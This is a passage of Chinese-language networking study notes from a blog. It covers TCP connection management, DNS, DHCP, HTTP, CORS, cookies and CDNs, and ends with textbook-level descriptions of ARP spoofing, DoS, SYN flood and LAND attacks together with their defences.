<li>而是把 cwnd 值设置为新的 ssthresh 值（减小后的值）</li>
<li>然后开始执行拥塞避免算法（“加增大”），使窗口缓慢地线性增大</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211009162033482.png" alt="image-20211009162033482"></p>
<h5 id="发送窗口的最大值"><a href="#发送窗口的最大值" class="headerlink" title="发送窗口的最大值"></a>发送窗口的最大值</h5><ul>
<li>发送窗口的最大值： swnd &#x3D; min(cwnd, rwnd)</li>
<li>当rwnd &lt; cwnd 时，是接收方的能力限制发送窗口最大值</li>
<li>当cwnd &lt; rwnd 时，则是网络的拥塞限制发送窗口最大值</li>
</ul>
<h2 id="第十天"><a href="#第十天" class="headerlink" title="第十天"></a>第十天</h2><h3 id="序号、确认号"><a href="#序号、确认号" class="headerlink" title="序号、确认号"></a>序号、确认号</h3><p><img src="/2021/10/01/network/TCP04_%E5%BA%8F%E5%8F%B7%E7%A1%AE%E8%AE%A4%E5%8F%B701_%E7%9B%B8%E5%AF%B9.png" alt="TCP04_序号确认号01_相对"></p>
<p>ACK返回的字节数是由序号+长度决定，即ACK是期望收到的下一个包的第一个字节</p>
<p><img src="/2021/10/01/network/TCP05_%E5%BA%8F%E5%8F%B7%E7%A1%AE%E8%AE%A4%E5%8F%B702_%E5%8E%9F%E7%94%9F.png" alt="TCP05_序号确认号02_原生"></p>
<p>相对序号：发送的第一个字节相对于这次数据传输的位置，由真实序号减去真实序号的初始值得到</p>
<p>真实序号：发送的序号会是一个很大的值，不会从1开始，初始值为随机生成</p>
<p><img src="/2021/10/01/network/image-20211011094430415.png" alt="image-20211011094430415"></p>
<p><img src="/2021/10/01/network/image-20211011094452376.png" alt="image-20211011094452376"></p>
<p><img src="/2021/10/01/network/image-20211011101643440.png" alt="image-20211011101643440"></p>
<p><img src="/2021/10/01/network/image-20211011101652915.png" alt="image-20211011101652915"></p>
<p><img src="/2021/10/01/network/image-20211011105309187.png" alt="image-20211011105309187"></p>
<h3 id="连接管理"><a href="#连接管理" class="headerlink" title="连接管理"></a>连接管理</h3><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>三次握手</p>
<p><img src="/2021/10/01/network/image-20211011105644914.png" alt="image-20211011105644914"></p>
<ul>
<li>前两次握手的特点<ul>
<li>SYN都设为1</li>
<li>数据部分长度都为0</li>
<li>TCO头部一般是32字节<ul>
<li>固定头部：20字节</li>
<li>选项部分：12字节</li>
<li><img src="/2021/10/01/network/image-20211011110403690.png" alt="image-20211011110403690"></li>
<li>选项部分：规定MMS，是否SACK，windows窗口缩放系数</li>
</ul>
</li>
</ul>
</li>
<li>为什么建立连接的时候,要进行3次握手?2次不行么?<ul>
<li>主要目的:防止 server端一直等待,浪费资源如果建立连接</li>
</ul>
</li>
<li>只需要2次握手,可能会出现的情况<ul>
<li>假设 client发出的第一个连接请求报文段,因为网络延迟,在连接释放以后的某个时间才到达 serve</li>
<li>本来这是一个早已失效的连接请求,但 server收到此失效的请求后,误认为是 client再次发出的一个新的连接请求</li>
<li>于是 server就向 client发出确认报文段,同意建立连接</li>
<li>如果不采用“3次握手”,那么只要 server发出确认,新的连接就建立了，由于现在 client并没有真正想连接服务器的意愿,因此不会理睬 server的确认,也不会冋 server发送数据</li>
<li>但 server却以为新的连接已经建立,并一直等待client发来数据,这样, server的很多资源就白白浪费掉了</li>
</ul>
</li>
<li>采用“三次握手”的办法可以防止上述现象发生<ul>
<li>例如上述情况, client没有冋 server的确认发岀确认,serνer由于收不到确认,就知道 client并没有要求建立连接</li>
</ul>
</li>
</ul>
<h2 id="第十一天"><a href="#第十一天" class="headerlink" title="第十一天"></a>第十一天</h2><h4 id="释放连接"><a href="#释放连接" class="headerlink" title="释放连接"></a>释放连接</h4><p>四次握手</p>
<p><img src="/2021/10/01/network/image-20211011141737740.png" alt="image-20211011141737740"></p>
<p>由客服端发起的主动断开，主动断开可以由任意一方断开</p>
<hr>
<p><strong>状态</strong></p>
<ul>
<li>FIN -WAITWAIT-1：表示想主动关闭连接<ul>
<li>向对方发送了 FIN 报文，此时进入到 FIN -WAITWAIT-1状态</li>
</ul>
</li>
<li>CLOSECLOSE-WAITWAIT：表示在等待关闭<ul>
<li>当对方发送 FIN 给自己，会回应一个 ACK 报文给对方，此时则进入到 CLOSECLOSE-WAIT 状态</li>
<li>在此状态下，需要考虑自己是否还有数据发送 给对方如果没FIN 报文给对方</li>
</ul>
</li>
<li>FIN -WAITWAIT-2：只要对方发送 ACK 确认后，主动方就会处于 FIN -WAITWAIT-2状态，然后等待对方发送 FIN 报文</li>
<li>CLOSINGCLOSING：一种比较罕见的例外状态<ul>
<li>表示你发送 FIN 报文后，并没有收到对方的 ACK 报文，反而却也收到了对方的 FIN 报文</li>
<li>如果双方几乎在同时准备关闭连接的话，那么就出现了发送FIN 报文的情况，也即会出现 CLOSING 状态</li>
<li>表示双方都正在关闭连接</li>
</ul>
</li>
<li>LAST-ACKACK：被动关闭一方在发送 FIN 报文后，最等待对方的 ACK 报文<ul>
<li>当收到 ACK 报文后，即可进入 CLOSED 状态了</li>
</ul>
</li>
<li>TIME -WAITWAIT：表示收到了对方的 FIN 报文，并发送出了 ACK 报文，就等 2MSL 后即可进入 CLOSED 状态了<ul>
<li>如果 FIN -WAITWAIT-1状态下，收到了对方同时带 FIN 标志和 ACK 标志的报文时</li>
<li>可以直接进入到 TIME -WAIT 状态，而无须经过 FIN -WAITWAIT-2状态</li>
</ul>
</li>
<li>CLOSEDCLOSED：关闭状态</li>
</ul>
<blockquote>
<p>由于有些状态的时间比较短暂，所以很难用 netstat 命令看到，比如 SYN -RCVD 、FIN -WAITWAIT-1等</p>
</blockquote>
<hr>
<p><strong>细节</strong></p>
<ul>
<li><p>TCP&#x2F;IP 协议栈在设计上，允许任何一方先发起断开请求。这里演示的是 client 主动要求断开</p>
</li>
<li><p>client 发送 ACK 后，需要有个 TIME -WAIT 阶段，等待一时间后再真正关闭连接</p>
<ul>
<li>一般是等待 <strong>2倍的 MSL</strong> （Maximum Segment Lifetime Lifetime，最大分段生存期）</li>
<li>MSL 是TCP 报文在 Internet 上的最长生存时间</li>
<li>每个具体的 TCP 实现都必须选择一个确定的 MSL 值， RFC 1122 建议是 2分钟</li>
<li>可以防止本次连接中产生的数据包误传到下一（因为都会在 2MSL 时间内消失了）</li>
</ul>
</li>
<li><p>如果 client 发送 ACK 后马上释放了， 然又因为网络原server 没有收到 client 的ACKACK，server 就会重发 FIN</p>
</li>
<li><p>这时可能出现的情况是<br>① client 没有任何响应，服务器那边会干等甚至多次重发 FIN ，浪费资源<br>② client 有个新的应用程序刚好分配了同一端口号，收到 FIN 后马上开始执行断连接的操作，本来 它可能是想跟 server 建</p>
</li>
<li><p><strong>为什么释放连接的时候，要进行 4次挥手？</strong></p>
<ul>
<li>TCP 是全双工模式</li>
<li>第1次挥手：当 主机 1发出 FIN 报文段时<ul>
<li>表示 主机 1告诉 主机 2，主机 1已经没有数据要发送了，但是此时 主机 1还是可以接受来自 主机 2的数据</li>
</ul>
</li>
<li>第2次挥手：当 主机 2返回 ACK 报文段时<ul>
<li>表示 主机 2已经知道 主机 1没有数据发送了，但是 主机 2还是可以发送数据到 主机 1的</li>
</ul>
</li>
<li>第3次挥手：当 主机 2也发送了 FIN 报文段时<ul>
<li>表示 主机 2告诉 主机 1，主机 2已经没有数据要发送了</li>
</ul>
</li>
<li>第4次挥手：当 主机 1返回 ACK 报文段时<ul>
<li>表示 主机 1已经知道 主机 2没有数据发送了。随后正式断开整个 TCP 连接</li>
</ul>
</li>
</ul>
</li>
<li><p>有时候在使用抓包工具的，可能只会看到“ 3次“挥手</p>
<ul>
<li>这其实是将第 2、3次挥手合并了</li>
</ul>
</li>
<li><p>当server接收到client的FIN时，如果server后面也没有数据要发送给client了</p>
<ul>
<li>这时，server 就可以将第 2、3次挥手合并，同时告诉client两件事</li>
<li>已经知道client没有数据要发</li>
<li>server已经没有数据要发了</li>
</ul>
</li>
</ul>
<blockquote>
<p>当程序被强制终止时，程序会发送RST强制关闭。</p>
<p>为节省资源，服务器可能会由于在规定时间内没有收到客户端发来的数据包而发起主动断开。为了确保TCP连接，客户端会每隔一定时间发送一个心跳包</p>
</blockquote>
<p><img src="/2021/10/01/network/TCP%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B01.png" alt="TCP完整流程01"></p>
<p><img src="/2021/10/01/network/TCP%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B02.png" alt="TCP完整流程02"></p>
<h2 id="第十二天"><a href="#第十二天" class="headerlink" title="第十二天"></a>第十二天</h2><blockquote>
<ul>
<li><p>长连接和短连接？</p>
<ul>
<li>短连接：收到数据即断开连接就是短连接</li>
<li>长连接：收到数据后不断开连接</li>
</ul>
</li>
<li><p>连接没有断开：则会在内存中保存Socket通信，不发数据不会对网卡有影响</p>
</li>
</ul>
</blockquote>
<hr>
<p><strong>socket连接</strong></p>
<p>客户端与服务器的连接是独立的。</p>
<p>服务器运行serversocket，收到客户端发送的socket请求后会创建一个socket对象负责与客户端的连接</p>
<h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><h4 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h4><ul>
<li>超文本传输：HTTP、HTTPS</li>
<li>文本传输：FTP</li>
<li>电子邮件：SMTP、POP3、IMAP</li>
<li>动态主机配置：DHCP</li>
<li>域名系统：DNS</li>
</ul>
<h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><ul>
<li>由于 IP 地址不方便记忆，并且能表达组织的名称和性质人们设计出了域（比如 baidu.com com）<ul>
<li>但实际上，为了能够访问到具体的 主机最终还是得知道目标IP地址</li>
</ul>
</li>
<li>为啥部直接用域名，放弃IP地址<ul>
<li>IP 地址固定 4个字节，域名随便都至少 10 几个字节，这无疑会增加路由器的负担浪费流量</li>
</ul>
</li>
<li>根据级别不同，域名可以分为<ul>
<li>顶级域名（ TopTop-level Domain Domain，简称 TLD ）<ul>
<li>通用顶级域名（ General Top Top-level Domain Domain，简称 gTLD ）<ul>
<li>.com （公司）， .net （网络机构）， .org org（组织机构）， .edu （教育）</li>
<li>.gov （政府部门）， .int （国际组织）等</li>
</ul>
</li>
<li>国家及地区顶级域名（ Country Code Top Top-level Domain Domain，简称 ccTLDccTLD）<ul>
<li>.cn （中国）、 .jp （日本）、 .uk （英国）</li>
</ul>
</li>
<li>新通用顶级域名（ New Generic Top Top-level Domain Domain，简称： New gTLD gTLD）<ul>
<li>.vip 、.xyz 、.top 、.club 、.shop 等</li>
</ul>
</li>
</ul>
</li>
<li>二级域名</li>
<li>三级域名</li>
</ul>
</li>
</ul>
<blockquote>
<p>域名级别与域名内容无关，与域名位置有关。最末尾的域名为顶级域名。</p>
</blockquote>
<h4 id="DNS（Domain-Name-System-x2F-域名系统）"><a href="#DNS（Domain-Name-System-x2F-域名系统）" class="headerlink" title="DNS（Domain Name System&#x2F;域名系统）"></a>DNS（Domain Name System&#x2F;域名系统）</h4><ul>
<li>利用DNS协议，可以将域名（比如baidu.com）解析成对应的IP地址（比如220.181.38.148）</li>
<li>DNS可以基于UDP协议，也可以基于TCP协议，服务器占用53端口</li>
</ul>
<p><img src="/2021/10/01/network/image-20211012103557557.png" alt="image-20211012103557557"></p>
<ul>
<li>客户端首先会访问最近的一台DNS服务器（也就是客户端自己配置的DNS服务器）</li>
<li>所有的DNS服务器都记录了DNS根域名服务器的IP地址</li>
<li>上级DNS服务器记录了下一级DNS服务器的IP地址</li>
<li>全球一共13台IPv4的DNS根域名服务器、25台IPv6的DNS根域名服务器</li>
</ul>
<p><strong>查询一个域名的IP地址流程</strong></p>
<ol>
<li>首先访问最近的DNS服务器，如果该服务器有域名的IP地址则直接返回IP地址</li>
<li>该服务器没有域名的IP地址，则由该DNS服务器向DNS根域名服务器发出请求，DNS服务器返回顶级域名服务器的IP地址</li>
<li>离用户最近的服务向顶级域名服务器发出请求，顶级域名DNS服务器如果知道该域名的IP地址则返回IP地址，不知道则返回下一级域名的DNS服务器的IP地址给离用户最近的服务器</li>
<li>同上，直到找到域名的IP地址，返回给离用户最近的服务器后，再由该服务器将IP地址返回给用户</li>
</ol>
<hr>
<h2 id="第十三天"><a href="#第十三天" class="headerlink" title="第十三天"></a>第十三天</h2><h4 id="IP地址的分配"><a href="#IP地址的分配" class="headerlink" title="IP地址的分配"></a><strong>IP地址的分配</strong></h4><ul>
<li>静态IP地址<ul>
<li>手动设置</li>
</ul>
</li>
<li>动态IP地址<ul>
<li>从DHCP服务器自动获取IP地址</li>
</ul>
</li>
</ul>
<h4 id="DHCP（Dynamic-Host-Configuration-Protocol）动态主机配置协议"><a href="#DHCP（Dynamic-Host-Configuration-Protocol）动态主机配置协议" class="headerlink" title="DHCP（Dynamic Host Configuration Protocol）动态主机配置协议"></a>DHCP（Dynamic Host Configuration Protocol）动态主机配置协议</h4><p>DHCP 协议基于 UDP 协议，客户端是 68 端口，服务器是 67端口</p>
<p>DHCP服务器会从地址池中,挑选一个地址“出租“给客户端一段时间,时间到期就回收它们家里上网的路由器就可以充当DHCP服务器</p>
<p><strong>DHCP分配IP地址的4个阶段</strong></p>
<ul>
<li>DISCOVER:发现服务器<ul>
<li>发广播包(源P是0.0.0.0,目标P是255.255255255,目标MAC<br>FF: FF: FF:FF</li>
</ul>
</li>
<li>OFFER:提供租约<ul>
<li>服务器返回可以租用的P地址,以及租用期限、子网掩码、网关、DNS等信息</li>
<li>注意:这里可能会有多个服务器提供租约</li>
</ul>
</li>
<li>REQUEST:选择|地址<ul>
<li>客户端选择一个OFFER,发送广播包进行回应</li>
</ul>
</li>
<li>ACKNOWLEDGE:确认<ul>
<li>被选中的服务器发送ACK数据包给客户端</li>
<li>至此,地址分配完</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211013092500558.png" alt="image-20211013092500558"></p>
<p><strong>细节</strong></p>
<ul>
<li>DHCP服务器可以跨网段分配地址么?(DHCP服务器、客户端不在同一个网段)<ul>
<li>以借助DHCP中继代理( DHCP Relay Agent)实现跨网段分配地址</li>
</ul>
</li>
<li>自动续约<ul>
<li>客户端会在租期不足的时候,自动向DHCP服务器发送 REQUEST信息申请续约</li>
</ul>
</li>
</ul>
<h4 id="HTTP（超文本传输协议）"><a href="#HTTP（超文本传输协议）" class="headerlink" title="HTTP（超文本传输协议）"></a>HTTP（超文本传输协议）</h4><ul>
<li>HTTP<ul>
<li>是互联网中应用最广泛的层协议之一。<br>设计 HTTP 最初的目是：提供一种发布和接收 HTML 页面的方法，由 URI 来标识具体的资源<br>后面用 HTTP 来传递的数据格式不仅是 HTML ，应用非常广泛</li>
</ul>
</li>
<li>HTML （ Hyper Text Markup Language）：超文本标记语言<ul>
<li>用以编写网页</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211013101603698.png" alt="image-20211013101603698"></p>
<p><img src="/2021/10/01/network/image-20211013101611795.png" alt="image-20211013101611795"></p>
<h2 id="第十四天"><a href="#第十四天" class="headerlink" title="第十四天"></a>第十四天</h2><h4 id="ABNF"><a href="#ABNF" class="headerlink" title="ABNF"></a>ABNF</h4><ul>
<li>ABNF是BNF （Backus -Naur Form Form，译为：巴科斯 -瑙尔范式）的修改、增强版</li>
<li>在RFC 5234 中表明： ABNF 用作 internet 中通信协议的定义语言</li>
<li>ABNF 是最严谨的 HTTP 报文格式描述形，脱离 ABNF 谈论 HTTP 报</li>
</ul>
<p><img src="/2021/10/01/network/image-20211013154953046.png" alt="image-20211013154953046"></p>
<hr>
<h5 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h5><p>HTTP-messagemessage&#x3D;    startstart-line<br>                                                *(header -fieldfieldCRLF )<br>                                                CRLF<br>                                                [message -body ]</p>
<p>start-line &#x3D; request-line &#x2F;status-line</p>
<hr>
<p><strong>request-line,status-line</strong></p>
<p>request-line&#x3D; method SP request-target SP HTTP-version CRLF</p>
<p>HTTP-version &#x3D; HTTP-name “&#x2F;“ DIGIT “.” DIGIT</p>
<p>HTTP-name&#x3D;%×48.54.54.50; HTTP</p>
<p>GET &#x2F;hello&#x2F; HTTP&#x2F;1.1</p>
<p>status-line&#x3D;HTTP-version SP status-code SP reason-phrase CRLF</p>
<p>status-code&#x3D; 3DIGIT</p>
<p>eason-phrase&#x3D;*( HTAB&#x2F;SP&#x2F;VCHAR &#x2F;obs-text)</p>
<p>HTTP&#x2F;1.1 200</p>
<p>HTTP&#x2F;1.1 200 OK</p>
<hr>
<p><strong>header-filed,message-body</strong></p>
<p>header-field &#x3D; field-name “:” OWS field-value OWS</p>
<p>field-name &#x3D; token</p>
<p>field-value &#x3D; * (field-content &#x2F; obs-fold)</p>
<p>OWS &#x3D; * (SP&#x2F; HTAB)</p>
<p>message-body&#x3D;*OCTET</p>
<p><strong>URL编码</strong></p>
<p>URL 中一旦出现了些特殊字符（比如文、空格），需要进行 编码<br>在浏览器地址栏输入 URL 时，是采用 UTF -8进行编码</p>
<h5 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h5><p>GET 、HEAD 、POST 、PUT 、DELETE 、CONNECT 、OPTIONS 、TRACE</p>
<ul>
<li>GET ：常用于读取的操作，请求参数直接拼在 URL 的后面（浏览器对 URL 是有长度限制的）</li>
<li>POST ：常用于添加、修改删除的操作，请求参数可以放到体中（没有大小限制）</li>
<li>HEAD：请求得到与 GET 请求相同的响应，但没有体<ul>
<li>使用场景举例：在下载一个大文件前，先获取其小再决定是否要。以此可节约带宽资源</li>
</ul>
</li>
<li>OPTIONS ：用于获取目的资源所支持通信选项，比如服务器请求方法<ul>
<li>OPTIONS * HTTP&#x2F;1.1</li>
</ul>
</li>
<li>PUT ：用于对已存在的资源进行整体覆盖</li>
<li>PATCH：用于对资源进行部分修改（不存在，会创建新的）</li>
<li>DELETE ：用于删除指定的资源</li>
<li>TRACE：请求服务器回显其收到的信息，主要用于 HTTP 请求的测试或诊断</li>
<li>CONNECT：可以开启一个客户端与所请求资源之间的双向沟通道，它用来创建隧（ tunnel ）<ul>
<li>可以用来访问采了 SSL (HTTPS) 协议的站点</li>
</ul>
</li>
</ul>
<h5 id="头部字段"><a href="#头部字段" class="headerlink" title="头部字段"></a>头部字段</h5><p>头部字段可以分为 4种类型</p>
<ul>
<li>请求头字段（ Request Header Fields Fields）<ul>
<li>有关要获取的资源或客户端本身信息消头</li>
</ul>
</li>
<li>响应头字段（ Response Header Fields Fields）<ul>
<li>有关响应的补充信息，比如服务器本身（名称和版等）消头</li>
</ul>
</li>
<li>实体头字段（ Entity Header Fields Fields）<ul>
<li>有关实体主的更多信息，比如长度（ ContentContent-Length ）或其 MIME 类型</li>
</ul>
</li>
<li>通用头字段（ General Header Fields Fields）<ul>
<li>同时适用于请求和响应消息，但与主体无关的头</li>
</ul>
</li>
</ul>
<p><strong>请求头字段</strong></p>
<p><img src="/2021/10/01/network/image-20211013160557396.png" alt="image-20211013160557396"></p>
<p><img src="/2021/10/01/network/image-20211013160609819.png" alt="image-20211013160609819"></p>
<blockquote>
<p>q值越大，表示优先级高<br>如果不指定 q值，默认是 1.0 （1.0）</p>
</blockquote>
<p><img src="/2021/10/01/network/image-20211013160646998.png" alt="image-20211013160646998"></p>
<p><strong>响应头字段</strong></p>
<p><img src="/2021/10/01/network/image-20211013160718081.png" alt="image-20211013160718081"></p>
<p><img src="/2021/10/01/network/image-20211013160730182.png" alt="image-20211013160730182"></p>
<p><img src="/2021/10/01/network/image-20211013160740837.png" alt="image-20211013160740837"></p>
<blockquote>
<p>下载文件时，首先使用HEAD方法，获得下载文件的大小，可以使用Range选取请求的字节序列，实现多线程下载，提高下载速率。</p>
</blockquote>
<h2 id="第十五天"><a href="#第十五天" class="headerlink" title="第十五天"></a>第十五天</h2><h4 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h4><ul>
<li>信息响应： 100~199</li>
<li>成功响应： 200~299</li>
<li>重定向： 300~399</li>
<li>客户端错误： 400~499</li>
<li>服务器错误 ：500~599</li>
</ul>
<p>常见状态码</p>
<ul>
<li><p>100 Continue</p>
<ul>
<li>请求的初始部分已经被服务器收到，并且没有拒绝。客户端应该继续发送剩余如果完成，就忽略这个响应</li>
<li>允许客户端发送带请求体的前，判断服务器是否愿意接收（通过头）</li>
<li>在某些情况下，如果服务器不看请求体就拒绝时客户端发送是恰当的或低效的</li>
</ul>
</li>
<li><p>200 OK ：请求成功</p>
</li>
<li><p>302 Found：请求的资源被暂时移动到了由 Location 头部指定的 URL 上</p>
</li>
<li><p>304 Not Modified：说明无需再次传输请求的内容，也就是可以使用缓存的内容</p>
</li>
<li><p>400 Bad Request：由于语法无效，服务器理解该请求</p>
</li>
<li><p>401 Unauthorized：由于缺乏目标资源要求的身份验证凭</p>
</li>
<li><p>403 Forbidden：服务器端有能力处理该请求，但是拒绝授权访问</p>
</li>
<li><p>404 Not Found：服务器端无法找到所请求的资源</p>
</li>
<li><p>405 Method Not Allowed：服务器禁止了使用当前 HTTP 方法的请求</p>
</li>
<li><p>406 Not Acceptable：服务器端无法提供与 Accept -Charset 以及 Accept -Language 指定的值相匹配响应</p>
</li>
<li><p>408 Request Timeout：服务器想要将没有在使用的连接关闭</p>
<ul>
<li>一些服务器会在空闲连接上发送此信息，即便是客户端没有任何请求的情况下</li>
</ul>
</li>
<li><p>500 Internal Server Error：所请求的服务器遇到意外情况并阻止其执行</p>
</li>
<li><p>501 Not Implemented：请求的方法不被服务器支持，因此无处理</p>
<ul>
<li>服务器必须支持的方法（即不会返回这个状态码）只有 GET 和 HEAD</li>
</ul>
</li>
<li><p>502 Bad Gateway：作为网关或代理角色的服务器，从上游（如 tomcattomcat）中接收到的响应是无效</p>
</li>
<li><p>503 Service Unavailable：服务器尚未处于可以接受请求的状态</p>
<ul>
<li>通常造成这种情况的原因是由于服务器停机维护或者已超载</li>
</ul>
</li>
</ul>
<h4 id="form提交"><a href="#form提交" class="headerlink" title="form提交"></a>form提交</h4><ul>
<li>action ：请求的 URI</li>
<li>method ：请求方法（ GET 、POST ）</li>
<li>encodetype ：POST 请求时，体的编码方式</li>
<li>application&#x2F;x x-www -form -urlencoded （默认值）</li>
<li>用&amp;分隔参数，用 &#x3D;分隔键和值，字符用 URL 编码方式进行</li>
<li>Content-Type：multipart&#x2F;form form-data</li>
<li>文件上传时必须使用这种编码方式</li>
</ul>
<p><strong>请求头</strong></p>
<p><img src="/2021/10/01/network/image-20211014102614093.png" alt="image-20211014102614093"></p>
<h2 id="第十六天"><a href="#第十六天" class="headerlink" title="第十六天"></a>第十六天</h2><h4 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h4><p><strong>同源策略</strong></p>
<p>同源指：协议、域名、端口，相同</p>
<p>同源策略规定：在默认情况下，AJAX请求只能发送给同源的URL</p>
<blockquote>
<p>img、script、link、iframe、video、audio等标签不受同源策略的约束</p>
</blockquote>
<p>由不同源的网站发起的请求则为跨域，服务器默认是不允许跨域请求的。</p>
<p><strong>跨域资源共享</strong></p>
<ul>
<li>解决AJAX跨域请求的常用方法<ul>
<li>CORS( Cross- Origin Resource Sharing),跨域资源共享</li>
</ul>
</li>
<li>CORS的实现需要客户端和服务器同时支持<ul>
<li>客户端<ul>
<li>所有的浏览器都支持(IE至少是IE10版本)</li>
</ul>
</li>
<li>服务器<ul>
<li>需要返回相应的响应头(比如 Access- Contro1-A11ow- Origin）</li>
<li>告知浏览器这是一个允许跨域访问的请求</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p><img src="/2021/10/01/network/image-20211014153728493.png" alt="image-20211014153728493"></p>
<p>HTTP的每次请求都是独立的，与之前的请求没有直接联系。即之后的请求不知道之前的请求内容与情况，可能会出现，每个页面都要重新登录的情况。为解决这个问题，建立了会话跟踪机制。</p>
<p>session：服务器保存用户的信息</p>
<p>cookie：客户端保存用户的信息</p>
<p>步骤：</p>
<ol>
<li>客户端登录成功，服务器端会创建session，保存path（在网站服务器生效的路径）和domain（IP与端口）</li>
<li>服务器在返回客服端请求时会在相应头生成set-cookie命令，让客户端存储cookie值</li>
<li>客户端再请求时，发现请求的网址时domain并且请求路径符合path，则会添加请求头：cookie。</li>
<li>服务器端接收数据会，发现有cookie值，则与自己的session比对，发现依旧有效，则不必登录服务器，直接登录之前已经登录的账号。</li>
</ol>
<p>cookie默认存活半小时，浏览器一旦关闭就会清除，cookie只针对一个浏览器，其他浏览器无cookie值。</p>
<h2 id="第十七天"><a href="#第十七天" class="headerlink" title="第十七天"></a>第十七天</h2><h3 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h3><ul>
<li>正向代理<ul>
<li><img src="/2021/10/01/network/image-20211015105931970.png" alt="image-20211015105931970"></li>
</ul>
</li>
<li>反向代理<ul>
<li><img src="/2021/10/01/network/image-20211015105947376.png" alt="image-20211015105947376"></li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211015110122670.png" alt="image-20211015110122670"></p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>利用最靠近每位户的服务器<br>更快可靠地将音乐、图片视频等资源文件（一般是静态）传递给用户<br><img src="/2021/10/01/network/image-20211015110213967.png" alt="image-20211015110213967"></p>
<p><img src="/2021/10/01/network/image-20211015110230604.png" alt="image-20211015110230604"></p>
<p><img src="/2021/10/01/network/image-20211015110250293.png" alt="image-20211015110250293"></p>
<p><img src="/2021/10/01/network/image-20211015110302027.png" alt="image-20211015110302027"></p>
<p><img src="/2021/10/01/network/image-20211015110313676.png" alt="image-20211015110313676"></p>
<h3 id="安全威胁"><a href="#安全威胁" class="headerlink" title="安全威胁"></a>安全威胁</h3><ul>
<li>截获：窃听通信内容</li>
<li>中断：网络通信</li>
<li>篡改：通信内容</li>
<li>伪造：通信内容</li>
</ul>
<h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h4><ul>
<li>可让攻击者获取局域网上的数据包甚至可篡改数据包</li>
<li>可让网络上特定电脑之间无法正常通信（例如 网络执法官 这样的软件）</li>
<li>让送至特定 IP 地址的流量被错误送到攻击者所取代方</li>
</ul>
<p><strong>步骤</strong></p>
<p><img src="/2021/10/01/network/image-20211015110609783.png" alt="image-20211015110609783"></p>
<p><strong>防护</strong></p>
<ul>
<li>静态 ARP</li>
<li>DHCP Snooping</li>
<li>网络设备可借由 DHCP 保留网络上各电脑的 MAC 地址，在伪造的 ARP 数据包发出时即可侦测到</li>
<li>利用一些软件监听 ARP 的不正常变动</li>
</ul>
<h4 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h4><ul>
<li>DoS 攻击（拒绝服务， Denial -of-Service attack）<ul>
<li>使目标电脑的网络或系统资源耗尽，服务暂时中断停止导致其正常用户无法访问</li>
</ul>
</li>
<li>DDoS 攻击（分布式拒绝服务， Distributed Denial -of-Service attack）<ul>
<li>黑客使用网络上两个或以被攻陷的电脑作为“僵尸”向特定目标发动 DoS 攻击</li>
<li>2018 年3月， GitHub 遭到迄今为止规模最大的 DDoS 攻击</li>
</ul>
</li>
<li>DoS 攻击可以分为 2大类<ul>
<li>带宽消耗型： UDP 洪水攻击、 ICMP 洪水攻击</li>
<li>资源消耗型： SYN 洪水攻击、 LAND 攻击</li>
</ul>
</li>
</ul>
<p><strong>防御</strong></p>
<ul>
<li>防御方式通常为：入侵检测、流量过滤和多重验证<ul>
<li>堵塞网络带宽的流量将被过滤，而正常可通</li>
</ul>
</li>
<li>防火墙<ul>
<li>防火墙可以设置规则，例如允许或拒绝特定通讯协议端口IP地址</li>
<li>当攻击从少数不正常的 IP 地址发出时，可以简单的使用拒绝规则阻止一切从攻击源 IP 发出的通信</li>
<li>复杂攻击难以用简单规则来阻止，例如 80 端口遭受攻击时不可能拒绝所有的通信，因为同会阻止合法流量</li>
<li>防火墙可能处于网络架构中过后的位置，路由器在恶意流量达到前即被攻击影响</li>
</ul>
</li>
<li>交换机 ：大多数交换机有一定的速度限制和访问控能力</li>
<li>路由器 ：和交换机类似，路由器也有一定的速度限制访问控能力</li>
<li>黑洞引导<ul>
<li>将所有受攻击计算机的通信全部发送至一个“黑洞”（空接口或不存在地址）者足够能力处理洪流的网络设备商，以避免受到较大影响</li>
</ul>
</li>
<li>流量清洗<ul>
<li>当流量被送到 DDoS 防护清洗中心时，通过采用抗 DDoS 软件处理，将正常流量和恶意区分开</li>
<li>正常的流量则回注客户网站</li>
</ul>
</li>
</ul>
<h5 id="SYN洪水攻击（传输层）"><a href="#SYN洪水攻击（传输层）" class="headerlink" title="SYN洪水攻击（传输层）"></a>SYN洪水攻击（传输层）</h5><ul>
<li><p>SYN 洪水攻击（ SYN flooding attack attack）</p>
<ul>
<li>攻击者发送一系列的 SYN 请求到 目标，然后让因收不ACK（第 3次握手）而进行等待、消耗资源</li>
</ul>
</li>
<li><p>攻击方法</p>
<ul>
<li>跳过发送最后的 ACK 信息</li>
<li>修改源 IP 地址，让目标送 SYN -ACK 到伪造的 IP 地址，因此目标永不可能收到 ACK（第 3次握手）</li>
</ul>
</li>
<li><p>防护</p>
<ul>
<li>参考： RFC 4987</li>
</ul>
</li>
</ul>
<h5 id="LAND攻击（传输层）"><a href="#LAND攻击（传输层）" class="headerlink" title="LAND攻击（传输层）"></a>LAND攻击（传输层）</h5><ul>
<li>LAND 攻击（局域网拒绝服务， Local Area Network Denial attack）<ul>
<li>通过持续发送 相同源地址 和目标的欺骗数据包，使目标试图与自己建立连接消耗系统资源直至崩溃</li>
</ul>
</li>
